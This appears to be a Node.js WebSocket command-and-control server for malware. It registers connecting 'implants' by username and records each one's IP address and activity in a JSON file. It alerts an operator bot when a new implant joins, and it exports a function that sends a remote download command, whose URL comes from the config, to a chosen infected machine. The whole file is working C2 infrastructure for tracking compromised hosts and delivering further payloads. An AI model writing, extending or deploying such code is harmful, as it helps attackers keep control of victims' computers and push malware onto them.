const WebSocket = require('ws');
const fs = require('fs/promises');
const path = require('path');

const { notifyLOG } = require('./bot.js');
const config = require('./config.json');

const SYSTEMS_FILE = path.join(__dirname, 'systems.json');
const PORT = 3010;
const PATH = '/ws';

const HEARTBEAT_INTERVAL = 35_000;  // how often we send pings
const HEARTBEAT_TIMEOUT  = 50_000;  // must receive pong within this time

const clients = new Map(); // username → WebSocket
const systems = new Map(); // username → system metadata

// ──────────────────────────────────────────────────────────────────────────────
// Persistence
// ──────────────────────────────────────────────────────────────────────────────

async function loadSystems() {
  try {
    const data = await fs.readFile(SYSTEMS_FILE, 'utf8');
    const loaded = JSON.parse(data);
    
    for (const [username, info] of Object.entries(loaded)) {
      systems.set(username, {
        ...info,
        active: false, // assume offline on server start
        lastSeen: info.lastSeen || Date.now(),
      });
    }
    
    console.log(`[i] Loaded ${systems.size} known systems`);
  } catch (err) {
    if (err.code === 'ENOENT') {
      console.log('[i] systems.json not found → starting clean');
    } else {
      console.error('[!] Failed to load systems.json:', err.message);
    }
  }
}

async function saveSystems() {
  try {
    const data = Object.fromEntries(systems);
    await fs.writeFile(SYSTEMS_FILE, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.error('[!] Failed to save systems.json:', err.message);
  }
}

// ──────────────────────────────────────────────────────────────────────────────
// Cleanup helper
// ──────────────────────────────────────────────────────────────────────────────

function cleanupClient(username, reason = 'unknown') {
  clients.delete(username);
  
  const system = systems.get(username);
  if (system) {
    system.active = false;
    system.lastSeen = Date.now();
    system.lastDisconnectReason = reason;
  }
  
  console.log(`[-] ${username} cleaned up (${reason})`);
  saveSystems().catch(() => {}); // don't block on save
}

// ──────────────────────────────────────────────────────────────────────────────
// Server startup
// ──────────────────────────────────────────────────────────────────────────────

loadSystems().then(() => {
  const wss = new WebSocket.Server({ port: PORT, path: PATH });
  
  console.log(`[✓] WebSocket server started → ws://0.0.0.0:${PORT}${PATH}`);

  // Heartbeat / zombie killer
  setInterval(() => {
    const now = Date.now();
    
    for (const [username, ws] of [...clients.entries()]) {
      if (now - ws.lastPong > HEARTBEAT_TIMEOUT) {
        console.log(`[✗] Heartbeat timeout → ${username}`);
        ws.terminate();
        cleanupClient(username, 'heartbeat_timeout');
        continue;
      }
      
      ws.isAlive = false;
      ws.ping();
    }
  }, HEARTBEAT_INTERVAL);

  wss.on('connection', (ws, req) => {
    console.log('[+] New connection');

    let username = null;
    ws.isAlive = true;
    ws.lastPong = Date.now();

    ws.on('pong', () => {
      ws.isAlive = true;
      ws.lastPong = Date.now();
    });

    ws.on('message', async (raw) => {
      try {
        const data = JSON.parse(raw.toString());

        if (!data?.type) return;

        switch (data.type) {
          case 'register': {
            const candidate = String(data.username ?? '').trim();

            if (!candidate || candidate.length < 3 || candidate.length > 64) {
              ws.send(JSON.stringify({ error: 'invalid_username' }));
              ws.close(1008, 'Username must be 3–64 characters');
              return;
            }

            // Prevent takeover / concurrent connections
            if (clients.has(candidate) && clients.get(candidate) !== ws) {
              ws.send(JSON.stringify({ error: 'username_taken' }));
              ws.close(1008, 'Username already connected');
              return;
            }

            // Clean previous connection if exists (rare race)
            if (clients.has(candidate)) {
              clients.get(candidate).terminate();
            }

            username = candidate;
            clients.set(username, ws);

            const now = Date.now();

            if (!systems.has(username)) {
              systems.set(username, {
                uuid: data.uuid || 'unknown',
                startTime: data.starttime || now,
                firstSeen: now,
                lastSeen: now,
                active: true,
                ip: req.socket.remoteAddress || 'unknown',
                lastDisconnectReason: null,
              });
              console.log(`[+] New system registered → ${username}`);
              notifyLOG?.(`New implant registered → ${username}`);
            } else {
              const sys = systems.get(username);
              sys.active = true;
              sys.lastSeen = now;
              sys.lastDisconnectReason = null;
              console.log(`[+] Reconnected → ${username}`);
            }

            await saveSystems();
            break;
          }

          case 'ping': {
            if (!username) return;
            const sys = systems.get(username);
            if (sys) {
              sys.active = true;
              sys.lastSeen = Date.now();
            }
            break;
          }

          default:
            console.debug(`[?] Unknown type from ${username ?? 'unknown'}: ${data.type}`);
        }
      } catch (err) {
        console.warn(`[!] Bad message from ${username ?? '?'} →`, err.message);
      }
    });

    ws.on('close', (code, reason) => {
      if (username) {
        cleanupClient(username, `close_${code}${reason ? `_${reason}` : ''}`);
      } else {
        console.log(`[-] Anonymous connection closed (code ${code})`);
      }
    });

    ws.on('error', (err) => {
      console.error(`[!] WS error ${username ? `(${username})` : ''}:`, err.message);
    });
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// Public API
// ──────────────────────────────────────────────────────────────────────────────

async function sendDownload(username) {
  const ws = clients.get(username);
  if (!ws) {
    console.warn(`[!] sendDownload: ${username} not connected`);
    return false;
  }

  if (ws.readyState !== WebSocket.OPEN) {
    console.warn(`[!] sendDownload: ${username} not OPEN (state: ${ws.readyState})`);
    return false;
  }

  try {
    ws.send(`download:${config.downloadUrl}`);
    console.log(`[→] Download command sent to ${username}`);
    return true;
  } catch (err) {
    console.error(`[!] Failed sending download to ${username}:`, err.message);
    return false;
  }
}

module.exports = {
  clients,
  systems,
  sendDownload,

};

